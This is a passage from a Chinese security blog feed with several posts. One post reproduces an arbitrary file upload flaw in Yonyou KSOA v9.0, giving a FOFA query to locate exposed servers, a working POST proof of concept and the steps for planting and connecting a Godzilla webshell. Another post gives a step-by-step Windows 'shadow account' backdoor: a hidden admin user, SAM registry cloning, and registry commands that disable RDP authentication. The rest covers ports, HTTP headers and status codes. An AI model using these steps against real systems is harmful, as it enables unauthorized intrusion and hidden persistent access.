    <content type="html"><![CDATA[<h4 id="产品介绍："><a class="header-anchor" href="#产品介绍：">¶</a>产品介绍：</h4><p>​用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的I需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。</p><h4 id="影响范围："><a class="header-anchor" href="#影响范围：">¶</a>影响范围：</h4><p>​ 用友时空企业信息融通平台KSOA v9.0</p><h4 id="fofa语句"><a class="header-anchor" href="#fofa语句">¶</a>fofa语句:</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;用友-时空KSOA&quot;</span><br></code></pre></td></tr></table></figure><h4 id="漏洞复现："><a class="header-anchor" href="#漏洞复现：">¶</a>漏洞复现：</h4><p>访问页面：</p><img src="/posts/b7d90640/image-20230714135815952.png" class title="image-20230714135815952"><p>​在此页面抓包发送到重放器，构造POC如下：（加上抓取的其他请求字段也可以，不影响结果,请求字段随便给）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/servlet/com.sksoft.bill.ImageUpload?filename=9.txt&amp;filepath=/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>[IP:port]<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><br><span class="language-ebnf"><span class="hljs-attribute">yyskupload</span></span><br></code></pre></td></tr></table></figure><img src="/posts/b7d90640/image-20230714140259067.png" class title="image-20230714140259067"><p>访问<a href="http://IP">http://IP</a>:port/pictures/9.txt</p><img src="/posts/b7d90640/image-20230714140449663.png" class title="image-20230714140449663"><p>上传成功！！！</p><p>这里把yyskupload修改成想上传的木马shell（我上传的是哥斯拉的马）</p><p>访问一下<img src="/posts/b7d90640/image-20230714140844997.png" class title="image-20230714140844997"></p><p>空白页没有报错说明上传成功！</p><p>哥斯拉直接连接</p><img src="/posts/b7d90640/image-20230714140812221.png" class><img src="/posts/b7d90640/image-20230714141005949.png" class title="image-20230714141005949"><p><strong>HelloWorld</strong>😘😘😘</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口号对应汇总</title>
    <link href="/posts/2cf00b0.html"/>
    <url>/posts/2cf00b0.html</url>
    
    <content type="html"><![CDATA[<h2 id="端口是干啥的？"><a class="header-anchor" href="#端口是干啥的？">¶</a>端口是干啥的？</h2><p>端口是TCP/IP协议簇中，<a href="https://so.csdn.net/so/search?q=%E5%BA%94%E7%94%A8%E5%B1%82&amp;spm=1001.2101.3001.7020">应用层</a>进程与传输层协议实体间的通信接口。端口是操作系统可分配的一种资源；应用程序通过系统调用与某端口绑定后，传输层传给改端口的数据都被相应进程接收，相应进程发给传输层的数据都通过端口输出。<br>为什么需要端口这个概念呢？在网络通信过程中，需要唯一识别通信两端的端点，就是使用端口识别运行于某主机中的应用程序。如果没有引入端口，则只能通过<em>进程号</em>进行识别。<em>进程号</em>是系统动态分配的，不同的系统会使用不同的进程标识符，应用程序在运行之前不知道自己的进程号，如果需要运行后再广播进程号则很难保证通信的顺利进行。而引入端口后，就可以利用端口号识别应用程序，同时通过固定端口号来识别和使用公共服务，如HTTP和FTP等</p><p>参考：<a href="https://blog.csdn.net/u010771356/article/details/54236265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168887658816800185898798%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168887658816800185898798&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-54236265-null-null.142">https://blog.csdn.net/u010771356/article/details/54236265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168887658816800185898798%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168887658816800185898798&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-54236265-null-null.142</a></p><h2 id="端口分类"><a class="header-anchor" href="#端口分类">¶</a>端口分类</h2><p>端口号是从0~65535</p><p>其中0~1023属于是固定端口，也叫<em>知名端口（Well-Known Ports）</em>，一般固定的分配给一些服务，不会改变；1024~65535是*动态端口（Dynamic Ports）*这些端口并不固定分配给某些服务，只要应用程序系统发出申请，就可以从中得到一些端口号进行使用，一个端口只能对于一个程序使用，但是一个程序可以占用多个端口。</p><h2 id="默认端口"><a class="header-anchor" href="#默认端口">¶</a>默认端口</h2><p>下面列举一些常见的默认端口</p><table><thead><tr><th>端口号</th><th>对应协议服务或者中间件</th></tr></thead><tbody><tr><td>21</td><td>FTP，默认的端口号为21/tcp（木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口）</td></tr><tr><td>22</td><td>SFTP、SSH（安全登录）、SCP（文件传输）、端口号重定向，默认的端口号为22/tcp</td></tr><tr><td>23</td><td>Telnet（不安全的文本传送），默认端口号为23/tcp（木马Tiny Telnet Server所开放的端口）</td></tr><tr><td>25</td><td>SMTP Simple Mail Transfer Protocol简单邮件传输协议（E-mail），默认端口号为25/tcp（木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）</td></tr><tr><td>69</td><td>TFTP（Trivial File Transfer Protocol），默认端口号为69/udp</td></tr><tr><td>53</td><td>DNS（Domain Name System）</td></tr><tr><td>67/68</td><td>DHCP（Dynamic Host Configuration Protocol）：67（服务器），68（客户端）</td></tr><tr><td>80</td><td>80HTTP服务器，默认端口号为80/tcp（木马Executor开放此端口）</td></tr><tr><td>110</td><td>POP3（Post Office Protocol version 3）是一个非常简单但功能有限的邮件读取协议</td></tr><tr><td>143</td><td>IMAP（Internet Message Access Protocol）（Internet消息访问协议）也是提供面向用户的邮件收取服务。常用的版本是<strong>IMAP4</strong></td></tr><tr><td>123</td><td>NTP（Network Time Protocol）NTP(Network Time Protocol)------网络时间协议-----<a href="https://so.csdn.net/so/search?q=%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE&amp;spm=1001.2101.3001.7020">应用层协议</a>，用来在分布式时间服务器和客户端之间进行时间同步。</td></tr><tr><td>161/162</td><td>SNMP（Simple Network Management Protocol）：161（代理），162（管理系统）<strong>SNMP(简单网络管理协议)</strong>： 专门用于在 IP <a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;spm=1001.2101.3001.7020">网络管理</a>网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，它是一种应用层协议。</td></tr><tr><td>433</td><td>443端口即网页浏览端口，主要是用于HTTPS服务，是提供加密和通过安全端口传输的另一种HTTP。</td></tr><tr><td>554</td><td>554端口默认情况下用于“Real Time Streaming Protocol”（实时流协议，简称RTSP）。</td></tr><tr><td>1024</td><td>1024端口一般不固定分配给某个服务，在英文中的解释是“Reserved”（保留）。</td></tr><tr><td>1080</td><td>1080端口是Socks代理服务使用的端口</td></tr><tr><td>1433</td><td><strong>Sql Server</strong>数据库</td></tr><tr><td>1521</td><td><strong>Oracle</strong>数据库</td></tr><tr><td>1755</td><td>1755端口默认情况下用于“Microsoft Media Server”（微软媒体服务器，简称MMS）</td></tr><tr><td>3306</td><td><strong>MySql</strong>数据库</td></tr><tr><td>3389</td><td>😈😈😈</td></tr><tr><td>4000</td><td>4000端口是用于大家经常使用的QQ聊天工具的，再细说就是为QQ客户端开放的端口，QQ服务端使用的端口是8000。</td></tr><tr><td>5000</td><td><strong>DB2</strong>数据库</td></tr><tr><td>5236</td><td>国产的<strong>DM达梦数据库</strong></td></tr><tr><td>6379</td><td><strong>Redis</strong>数据库</td></tr><tr><td>7001</td><td><strong>weblogic</strong>的默认端口是7001</td></tr><tr><td>8080</td><td><strong>JBOSS/TOMCAT/Oracle XDB（XML 数据库）/http</strong></td></tr><tr><td>11211</td><td><strong>Memcached</strong>数据库</td></tr><tr><td>27017</td><td><strong>MongoDB</strong>数据库</td></tr></tbody></table><p>之后没写到的再慢慢补充。。。😁😁😁</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>端口号</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows创建影子账户</title>
    <link href="/posts/f2d36e3a.html"/>
    <url>/posts/f2d36e3a.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>前提：创建影子账户再已经getshell并且可以使用system权限（直接远端更好）</p></blockquote><p>这里用win7做演示，本来是想用win10做实验的，但是win10是一个家庭版的，虽然用OSSQ转换成了专业版，但是最后用命令虽然显示命令完成，但还是无法开启3389。😵</p><p>需要远程上去，远程的话看另一篇文章😚</p><p>先创建一个管理员权限的隐藏账户（在账户名后跟一个$）</p><blockquote><p>这里就需要system权限，administrator权限都不能创建用户</p></blockquote><img src="/posts/f2d36e3a/image-20230709114018554-1688874024711-1-1688874026799-3.png" class title="image-20230709114018554"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user 98k$ admiN@123 /add<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup administrators 98k$ /add<br></code></pre></td></tr></table></figure><p>这里创建的账户用<code>net user</code>是看不到的，但是可以在本地用户和组<code>lusrmgr.msc或compmgmt.msc</code>里看到。</p><img src="/posts/f2d36e3a/image-202307091147240532.png" class title="image-20230709114724053"><p>接下来win+R输入<code>regedit</code>打开注册表，找到SAM这个文件夹，具体位置如下；需要将这个文件夹的权限都赋予administrator，然后重新打开，就可以看到用户的注册表信息了。</p><img src="/posts/f2d36e3a/image-20230709115053395.png" class title="image-20230709115053395"><p>之后访问一下我们刚创建的用户98k$,查看这文件中对于的字段，和上面的文件夹名称对应。</p><img src="/posts/f2d36e3a/image-20230709115325186.png" class title="image-20230709115325186"><p>再找到administrator的对应文件夹，将其中F文件的字段值复制出来，替换掉刚刚我们创建的用户的字段值。</p><img src="/posts/f2d36e3a/image-20230709115510369.png" class title="image-20230709115510369"><p>然后分别将Users和Names下的用户文件导出。（导出到桌面好找）</p><img src="/posts/f2d36e3a/image-20230709115629181.png" class title="image-20230709115629181"><p>到命令行（记得用管理员权限打开）输入命令将刚刚创建的用户删除。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">98k</span>$ /del<br></code></pre></td></tr></table></figure><img src="/posts/f2d36e3a/image-20230709115822973.png" class title="image-20230709115822973"><p>再找到刚刚我们导出的两个文件，双击分别再将他们导入到注册表。</p><img src="/posts/f2d36e3a/image-20230709120006106.png" class title="image-20230709120006106"><img src="/posts/f2d36e3a/image-20230709120011875.png" class title="image-20230709120011875"><p>此时再重新打开注册表，可以发现刚刚创建的用户还在，但是在本地用户和组以及<code>net user</code>命令中看不到该账户的存在，说明创建用户成功了。🌈🌈🌈</p><img src="/posts/f2d36e3a/image-20230709120146413.png" class title="image-20230709120146413"><h1>补充加更正！</h1><p>​1. 之前说的用Administrator账户继续创建影子账户，在后续的利用过程中发现并不好使，原因是在新的win7以及后续的win10等版本中，administrator账户是被禁用的状态，无法远程登录（正常登录都登不上）</p><p>​所以需要将一个其他具有管理员权限的账户的F值复制到影子账户的F值下！！！！</p><ol start="2"><li><p>在某些情况下（很小的情况下），密码不正确会被直接挡在门外（远程的界面都打不开）原因和解决：</p><p>鉴权开启时，我们在不知道账号密码的情况下无法登录到远程界面，但是鉴权关闭之后，无论我们输入的账号和密码是否正确，都可以进入远程界面窗口。</p><p>如何关闭鉴权模式，我们采用如下命令：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0</span><br></code></pre></td></tr></table></figure><p>0代表关闭，1代表开启</p><p>关闭鉴权模式还不够，还需要关闭securitylayer安全层验证 ：</p><p>具体指：0 就是连接前使用 rdp 协议进行身份验证，rdp 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行。</p><p>将其参数设置为0，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs '">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v SecurityLayer /t REG_DWORD /d 0<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>权限维持</category>
      
      <category>后渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>权限维持</tag>
      
      <tag>后渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Http请求头字段和响应头字段</title>
    <link href="/posts/de4bde88.html"/>
    <url>/posts/de4bde88.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Accept</span>：指定客户端能够接收的内容类型。<br><br><span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-variable">Charset</span>：浏览器可以接受的字符编码集。<br><br><span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-variable">Encoding</span>：指定浏览器可以支持的<span class="hljs-variable">web</span>服务器返回内容压缩编码类型。<br><br><span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-built_in">Language</span>：浏览器可接受的语言。<br><br><span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-variable">Ranges</span>：可以请求网页实体的一个或者多个子范围字段。<br><br><span class="hljs-variable">AuthorizationHTTP</span>：授权的授权证书。<br><br><span class="hljs-variable">Cache</span><span class="hljs-operator">-</span><span class="hljs-built_in">Control</span>：指定请求和响应遵循的缓存机制。<br><br><span class="hljs-variable">Connection</span>：表示是否需要持久连接。（<span class="hljs-variable">HTTP</span> <span class="hljs-number">1.1</span>默认进行持久连接）<br><br><span class="hljs-variable">CookieHTTP</span>：请求发送时，会把保存在该请求域名下的所有<span class="hljs-variable">cookie</span>值一起发送给<span class="hljs-variable">web</span>服务器。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-built_in">Length</span>：请求的内容长度。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-variable">Type</span>：请求的与实体对应的<span class="hljs-variable">MIME</span>信息。<br><br><span class="hljs-built_in">Date</span>：请求发送的日期和时间。<br><br><span class="hljs-variable">Expect</span>：请求的特定的服务器行为。<br><br><span class="hljs-variable">From</span>：发出请求的用户的<span class="hljs-variable">Email</span>。<br><br><span class="hljs-variable">Host</span>：指定请求的服务器的域名和端口号。<br><br><span class="hljs-built_in">If</span><span class="hljs-operator">-</span><span class="hljs-variable">Match</span>：只有请求内容与实体相匹配才有效。<br><br><span class="hljs-built_in">If</span><span class="hljs-operator">-</span><span class="hljs-variable">Modified</span><span class="hljs-operator">-</span><span class="hljs-variable">Since</span>：如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回<span class="hljs-number">304</span>代码。<br><br><span class="hljs-built_in">If</span><span class="hljs-operator">-</span><span class="hljs-built_in">None</span><span class="hljs-operator">-</span><span class="hljs-variable">Match</span>：如果内容未改变返回<span class="hljs-number">304</span>代码，参数为服务器先前发送的<span class="hljs-variable">Etag</span>，与服务器回应的<span class="hljs-variable">Etag</span>比较判断是否改变。<br><br><span class="hljs-built_in">If</span><span class="hljs-operator">-</span><span class="hljs-built_in">Range</span>：如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。<br><br><span class="hljs-built_in">If</span><span class="hljs-operator">-</span><span class="hljs-variable">Unmodified</span><span class="hljs-operator">-</span><span class="hljs-variable">Since</span>：只在实体在指定时间之后未被修改才请求成功。<br><br><span class="hljs-built_in">Max</span><span class="hljs-operator">-</span><span class="hljs-variable">Forwards</span>：限制信息通过代理和网关传送的时间。<br><br><span class="hljs-variable">Pragma</span>：用来包含实现特定的指令。<br><br><span class="hljs-variable">Proxy</span><span class="hljs-operator">-</span><span class="hljs-variable">Authorization</span>：连接到代理的授权证书。<br><br><span class="hljs-built_in">Range</span>：只请求实体的一部分，指定范围。<br><br><span class="hljs-variable">Referer</span>：先前网页的地址，当前请求网页紧随其后<span class="hljs-operator">,</span>即来路。<br><br><span class="hljs-variable">TE</span>：客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息。<br><br><span class="hljs-variable">Upgrade</span>：向服务器指定某种传输协议以便服务器进行转换（如果支持。<br><br><span class="hljs-variable">User</span><span class="hljs-operator">-</span><span class="hljs-variable">Agent</span>：内容包含发出请求的用户信息。<br><br><span class="hljs-variable">Via</span>：通知中间网关或代理服务器地址，通信协议。<br><br><span class="hljs-variable">Warning</span>：关于消息实体的警告信息<br><br><span class="hljs-variable">X</span><span class="hljs-operator">-</span><span class="hljs-variable">Forwarded</span><span class="hljs-operator">-</span><span class="hljs-built_in">For</span> <span class="hljs-operator">:</span> 记录一个请求从客户端出发到目标服务器过程中经历的代理，或者负载平衡设备的<span class="hljs-variable">IP</span>。<br><br></code></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-variable">Ranges</span>：表明服务器是否支持指定范围请求及哪种类型的分段请求。<br><br><span class="hljs-variable">Age</span>：从原始服务器到代理缓存形成的估算时间（以秒计，非负）。<br><br><span class="hljs-variable">Allow</span>：对某网络资源的有效的请求行为，不允许则返回<span class="hljs-number">405</span>。<br><br><span class="hljs-variable">Cache</span><span class="hljs-operator">-</span><span class="hljs-built_in">Control</span>：告诉所有的缓存机制是否可以缓存及哪种类型。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-variable">Encodingweb</span>：服务器支持的返回内容压缩编码类型。。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-built_in">Language</span>：响应体的语言。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-built_in">Length</span>：响应体的长度。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-variable">Location</span>：请求资源可替代的备用的另一地址。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-variable">MD5</span>：返回资源的<span class="hljs-variable">MD5</span>校验值。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-built_in">Range</span>：在整个返回体中本部分的字节位置。<br><br><span class="hljs-variable">Content</span><span class="hljs-operator">-</span><span class="hljs-variable">Type</span>：返回内容的<span class="hljs-variable">MIME</span>类型。<br><br><span class="hljs-built_in">Date</span>：原始服务器消息发出的时间。<br><br><span class="hljs-variable">ETag</span>：请求变量的实体标签的当前值。<br><br><span class="hljs-variable">Expires</span>：响应过期的日期和时间。<br><br><span class="hljs-built_in">Last</span><span class="hljs-operator">-</span><span class="hljs-variable">Modified</span>：请求资源的最后修改时间。<br><br><span class="hljs-variable">Location</span>：用来重定向接收方到非请求<span class="hljs-built_in">URL</span>的位置来完成请求或标识新的资源。<br><br><span class="hljs-variable">Pragma</span>：包括实现特定的指令，它可应用到响应链上的任何接收方。<br><br><span class="hljs-variable">Proxy</span><span class="hljs-operator">-</span><span class="hljs-built_in">Authenticate</span>：它指出认证方案和可应用到代理的该<span class="hljs-built_in">URL</span>上的参数。<br><br><span class="hljs-variable">refresh</span>：应用于重定向或一个新的资源被创造，在<span class="hljs-number">5</span>秒之后重定向（由网景提出，被大部分浏览器支持）<br><br><span class="hljs-variable">Retry</span><span class="hljs-operator">-</span><span class="hljs-built_in">After</span>：如果实体暂时不可取，通知客户端在指定时间之后再次尝试。<br><br><span class="hljs-variable">Serverweb</span>：服务器软件名称。<br><br><span class="hljs-built_in">Set</span><span class="hljs-operator">-</span><span class="hljs-variable">Cookie</span>：设置<span class="hljs-variable">Http</span> <span class="hljs-variable">Cookie</span>。<br><br><span class="hljs-variable">Trailer</span>：指出头域在分块传输编码的尾部存在。<br><br><span class="hljs-variable">Transfer</span><span class="hljs-operator">-</span><span class="hljs-variable">Encoding</span>：文件传输编码。<br><br><span class="hljs-variable">Vary</span>：告诉下游代理是使用缓存响应还是从原始服务器请求。<br><br><span class="hljs-variable">Via</span>：告知代理客户端响应是通过哪里发送的。<br><br><span class="hljs-variable">Warning</span>：警告实体可能存在的问题。<br><br><span class="hljs-variable">WWW</span><span class="hljs-operator">-</span><span class="hljs-built_in">Authenticate</span>：表明客户端请求实体应该使用的授权方案。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>Http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Http状态码汇总</title>
    <link href="/posts/12fab53.html"/>
    <url>/posts/12fab53.html</url>
    
    <content type="html"><![CDATA[<h2 id="1xx-信息提示"><a class="header-anchor" href="#1xx-信息提示">¶</a><strong>1xx - 信息提示</strong></h2><p>这些状态代码表示临时的响应。客户端在收到常规响应之前，应准备接收一个或多个 1xx 响应。</p><p>· 100 - Continue 初始的请求已经接受，客户应当继续发送请求的其余部分。（HTTP 1.1新）<br>· 101 - Switching Protocols 服务器将遵从客户的请求转换到另外一种协议（HTTP 1.1新）</p><h2 id="2开头-（请求成功）表示成功处理了请求的状态代码。"><a class="header-anchor" href="#2开头-（请求成功）表示成功处理了请求的状态代码。">¶</a>2开头 （请求成功）表示成功处理了请求的状态代码。</h2><p>200 （成功） 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。<br>201 （已创建） 请求成功并且服务器创建了新的资源。<br>202 （已接受） 服务器已接受请求，但尚未处理。<br>203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。<br>204 （无内容） 服务器成功处理了请求，但没有返回任何内容。<br>205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。<br>206 （部分内容） 服务器成功处理了部分 GET 请求。</p><h2 id="3开头-（请求被重定向）表示要完成请求，需要进一步操作。-通常，这些状态代码用来重定向。"><a class="header-anchor" href="#3开头-（请求被重定向）表示要完成请求，需要进一步操作。-通常，这些状态代码用来重定向。">¶</a>3开头 （请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</h2><p><strong>3开头 （请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</strong></p><p>300 （多种选择） 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</p><p>301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。<br>302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。<br>303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。<br>304 （未修改） 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。<br>305 （使用代理） 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。<br>307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</p><h2 id="4开头-（请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。"><a class="header-anchor" href="#4开头-（请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。">¶</a>4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。</h2><p>400 （错误请求） 服务器不理解请求的语法。<br>401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。<br>403 （禁止） 服务器拒绝请求。<br>404 （未找到） 服务器找不到请求的网页。<br>405 （方法禁用） 禁用请求中指定的方法。<br>406 （不接受） 无法使用请求的内容特性响应请求的网页。<br>407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。<br>408 （请求超时） 服务器等候请求时发生超时。<br>409 （冲突） 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。<br>410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。<br>411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。<br>412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。<br>413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。<br>414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。<br>415 （不支持的媒体类型） 请求的格式不受请求页面的支持。<br>416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。<br>417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。</p><h2 id="5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。-这些错误可能是服务器本身的错误，而不是请求出错。"><a class="header-anchor" href="#5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。-这些错误可能是服务器本身的错误，而不是请求出错。">¶</a>5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</h2><p><strong>5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</strong></p><p>500 （服务器内部错误） 服务器遇到错误，无法完成请求。<br>501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。<br>502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。<br>503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。<br>504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。<br>505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo添加emoji表情功能</title>
    <link href="/posts/83661a60.html"/>
    <url>/posts/83661a60.html</url>
    
